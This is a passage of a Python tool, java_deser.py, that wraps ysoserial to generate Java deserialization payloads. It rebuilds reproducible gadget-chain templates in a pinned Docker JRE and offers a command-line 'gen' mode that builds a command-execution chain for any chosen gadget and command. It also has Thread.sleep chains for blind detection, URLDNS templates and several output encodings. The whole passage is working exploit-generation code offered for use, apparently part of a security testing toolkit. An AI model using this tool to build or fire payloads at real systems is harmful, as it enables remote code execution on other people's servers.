    return data


def _sleep_build(gadget, ms, timeout=120):
    if not (jar_dir() / "classes" / "HuntressSleep.class").is_file():
        raise SystemExit("regen: no HuntressSleep.class (tools/setup_ysoserial.sh compiles it)")
    data, why = _run(docker_argv(["-cp", f"/y/{JAR_NAME}:/y/classes", "HuntressSleep", gadget, str(ms)]), timeout)
    if not data:
        raise SystemExit(f"regen: sleep generator failed for {gadget}: {why}")
    return data


def regen():
    """Rebuild java_templates.json from the jar in the pinned JRE. Each template is built twice and must agree
    (after normalize_pwner) and must hold its placeholder exactly once."""
    out = {"_meta": {"ysoserial": YSOSERIAL_VERSION, "jar_sha256": YSOSERIAL_SHA256, "image": JRE_IMAGE,
                     "placeholder_cmd": PLACEHOLDER_CMD, "placeholder_ms": PLACEHOLDER_MS,
                     "placeholder_url": PLACEHOLDER_URL, "sleep_generator": "tools/ysoserial/HuntressSleep.java"},
           "exec": {}, "sleep": {}}
    for g in TEMPLATE_GADGETS:
        a, b = _jar_build(g, PLACEHOLDER_CMD), _jar_build(g, PLACEHOLDER_CMD)
        if normalize_pwner(a) != normalize_pwner(b):
            raise SystemExit(f"regen: two builds of {g} differ")
        where = "tc_string" if a.count(_tc_string(PLACEHOLDER_CMD)) == 1 else "class_utf8"
        if a.count(PLACEHOLDER_CMD.encode()) != 1:
            raise SystemExit(f"regen: {g} holds the placeholder {a.count(PLACEHOLDER_CMD.encode())} times")
        out["exec"][g] = {"where": where, "b64": base64.b64encode(normalize_pwner(a)).decode()}
        s1, s2 = _sleep_build(g, PLACEHOLDER_MS), _sleep_build(g, PLACEHOLDER_MS)
        if s1 != s2 or s1.count(struct.pack(">q", PLACEHOLDER_MS)) != 1:
            raise SystemExit(f"regen: the sleep build of {g} is not reproducible or not unique")
        where = "class_long" if _class_blobs(s1) and any(
            struct.pack(">q", PLACEHOLDER_MS) in s1[p:p + n] for p, n in _class_blobs(s1)) else "long_field"
        out["sleep"][g] = {"where": where, "b64": base64.b64encode(s1).decode()}
        print(f"regen {g}: exec {len(a)} bytes ({out['exec'][g]['where']}), sleep {len(s1)} bytes ({where})")
    u = _jar_build("URLDNS", PLACEHOLDER_URL)
    out["urldns"] = {"b64": base64.b64encode(u).decode()}
    TEMPLATES.write_text(json.dumps(out, indent=1, sort_keys=True) + "\n")
    print(f"regen: wrote {TEMPLATES}")


def main(argv):
    import argparse
    ap = argparse.ArgumentParser(prog="java_deser.py", description=__doc__.split("\n\n")[0])
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("status")
    sub.add_parser("regen")
    sub.add_parser("gadgets")
    gp = sub.add_parser("gen", help="build one payload")
    gp.add_argument("gadget")
    gp.add_argument("command")
    gp.add_argument("--route", default="auto", choices=("auto", "docker", "java", "template"))
    gp.add_argument("--encode", default="base64", choices=ENCODINGS)
    gp.add_argument("--out", help="write here instead of stdout")
    sp = sub.add_parser("sleep", help="a Thread.sleep chain")
    sp.add_argument("gadget")
    sp.add_argument("seconds", type=float)
    sp.add_argument("--encode", default="base64", choices=ENCODINGS)
    sp.add_argument("--out")
    try:
        a = ap.parse_args(argv)
    except SystemExit as e:                 # argparse exits on --help / bad args; return the code instead
        return e.code if isinstance(e.code, int) else 2
    if a.cmd == "status":
        print(json.dumps(java_status(), indent=1))
        return 0
    if a.cmd == "regen":
        regen()
        return 0
    if a.cmd == "gadgets":
        for g, note in GADGETS.items():
            print(f"{g:20s} {note}")
        return 0
    try:
        p = ysoserial(a.gadget, a.command, route=a.route) if a.cmd == "gen" else java_sleep_payload(a.gadget, a.seconds)
    except JavaGap as e:
        print(f"JAVA GAP {e}", file=sys.stderr)
        return 3
    data = java_encode(p, a.encode)
    data = data.encode() if isinstance(data, str) else data
    print(f"{p.gadget} via {p.route}: {len(p)} bytes, sha256 {hashlib.sha256(p).hexdigest()}", file=sys.stderr)
    if a.out:
        Path(a.out).write_bytes(data)
    else:
        sys.stdout.buffer.write(data + (b"\n" if a.encode not in ("raw", "gzip") else b""))
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
